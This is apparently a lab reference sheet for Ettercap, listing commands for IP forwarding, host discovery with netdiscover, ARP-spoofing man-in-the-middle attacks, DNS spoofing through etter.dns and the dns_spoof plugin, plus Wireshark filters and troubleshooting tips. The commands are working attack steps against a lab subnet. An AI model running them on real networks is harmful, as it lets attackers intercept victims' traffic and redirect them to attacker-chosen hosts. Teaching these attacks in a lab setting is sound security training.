# Ettercap Reference Guide

## Enable IP Forwarding

### Enable Forwarding

```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

### Verify Forwarding

```bash
cat /proc/sys/net/ipv4/ip_forward
```

Expected output:

```text
1
```

---

# Host Discovery

## Discover Systems on Local Network

```bash
sudo netdiscover -r 10.0.2.0/24
```

---

# Launch Ettercap

## Text Interface

```bash
sudo ettercap -T -q -i eth0
```

## Graphical Interface

```bash
sudo ettercap -G
```

---

# ARP Spoofing

## Start MITM Attack

```bash
sudo ettercap -T -M arp:remote /10.0.2.5/ /10.0.2.1/
```

Purpose:
- redirect victim traffic
- intercept communications
- position attacker between victim and gateway

---

# DNS Spoofing

## Edit DNS Entries

```bash
sudo nano /etc/ettercap/etter.dns
```

Example:

```text
example.com A 10.0.2.3
```

---

## Enable DNS Spoofing Plugin

```bash
sudo ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /10.0.2.5/ /10.0.2.1/
```

---

# Packet Analysis

## Recommended Wireshark Filters

### DNS Traffic

```text
dns
```

### HTTP Traffic

```text
http
```

### Victim Traffic

```text
ip.addr == 10.0.2.5
```

---

# Common Commands

| Command | Purpose |
|---|---|
| ettercap -T | Launch text interface |
| ettercap -G | Launch GUI |
| -M arp:remote | Enable ARP spoofing |
| -P dns_spoof | Enable DNS spoofing |
| netdiscover | Discover network hosts |

---

# Common Troubleshooting

## Victim Loses Connectivity

### Resolution

Enable IP forwarding:

```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

---

## DNS Spoofing Failure

### Check:
- `/etc/ettercap/etter.dns`
- plugin configuration
- network connectivity

---

## No Hosts Detected

Verify:
- VirtualBox network mode
- subnet configuration
- adapter connectivity

---

# Useful Notes

- ARP spoofing works only on local networks.
- MITM attacks are easier against unencrypted protocols.
- HTTPS reduces effectiveness of traffic interception.
- DNS spoofing redirects victims to attacker-defined destinations.

---

# Related Labs

- MITM Attack Simulation
- DNS Poisoning
- Wireshark Traffic Analysis
- Packet Capture
- Network Interception